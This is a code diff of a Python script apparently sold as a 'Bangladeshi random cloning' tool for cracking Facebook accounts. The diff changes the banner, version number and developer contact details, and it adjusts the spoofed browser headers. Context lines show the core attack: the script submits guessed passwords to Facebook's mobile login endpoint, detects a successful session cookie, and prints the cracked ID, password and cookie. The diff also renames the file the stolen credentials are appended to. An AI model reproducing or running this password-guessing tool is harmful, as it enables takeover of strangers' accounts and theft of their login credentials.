@@ -121,24 +121,24 @@ def jalan(z):
         time.sleep(0.01)
 
   
-logo=(""" Jakaria Love SuHA \x1b[97m\033[37;41m
-███ █████  ██   ██  █████  ████  ██████  ██   ██  \033[1;37m 
-     ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██  \033[1;93m 
-     ██ ███████ █████   ███████ ██████  ██ ███████  \033[1;37m 
-██   ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██  \033[1;37m 
- █████  ██   ██ ██   ██ ██   ██ ██   ██ ██ ██   ██  \033[1;37m     
+logo=(""" Jakaria Love SuHA\033[1;37m
+████████  ██   ██  █████  ████  ██████  ██   ██ \33[1;92m
+     ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██\033[1;37m
+     ██ ███████ █████   ███████ ██████  ██ ███████  \033[1;93m 
+██   ██ ██   ██ ██  ██  ██   ██ ██   ██ ██ ██   ██ \33[1;92m
+ █████  ██   ██ ██   ██ ██   ██ ██   ██ ██ ██   ██ \033[1;37m
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
 ║  \x1b[97m\033[37;41m Welcome to my Jakaria Tools                          \033[0;m  ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                      
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
-║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V5.6 \033[0;m    ║
+║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V5.8 \033[0;m    ║
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
 \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-\33[1;92m║➣\033[1;37m DEVOLPER   :  Mohammad Jakaria    \033[1;93m ║               
-\33[1;92m║➣ FACEBOOK   : Md.Jakaria Fiad                           \33[1;92m║                 
-\33[1;92m║➣\033[1;93m WHATSAPP   :  01791023760     \33[1;92m ║
-\33[1;92m║➣\033[1;34m GITHUB     :      S-JK404                \33[1;92m ║          
-\33[1;92m║➣\033[1;35m TOOLS      :          BD RANDOM CRACKING \33[1;92m ║                 
+\33[1;92m║➣\033[1;91m DEVOLPER   :  Mohammad Jakaria  \33[1;92m║               
+\33[1;92m║➣ FACEBOOK   :      Md.Jakaria Fiad                           \33[1;92m║                 
+\33[1;92m║➣\033[1;93m WHATSAPP   : 01791023760       \033[1;93m  ║
+\33[1;92m║➣\033[1;34m GITHUB     :     S-JK404                 \033[1;93m ║          
+\33[1;92m║➣\033[1;35m TOOLS      :     BD RANDOM CRACKING \33[1;92m ║                 
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
@@ -267,20 +267,21 @@ def b(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             headers = {'authority': 'free.facebook.com',
-   'method': 'GET',
-    'path': '/login/device-based/login/async/',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36',}
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+             'sec-fetch-dest': 'document',
+             'sec-fetch-mode': 'navigate',
+             'sec-fetch-site': 'none',
+             'sec-fetch-user': '?1',
+             'upgrade-insecure-requests': '1',
+             'user-agent': 'Mozilla/5.0 (Windows NT 11.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5620.223 Safari/537.36',}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -289,7 +290,7 @@ def b(uid,pwx,tl):
                 print(f'\r\33[1;92m [Jakaria fire-💚] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[suha💙]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/jk.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/jahidok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -299,3 +300,4 @@ def b(uid,pwx,tl):
         pass
 Main()
  
+
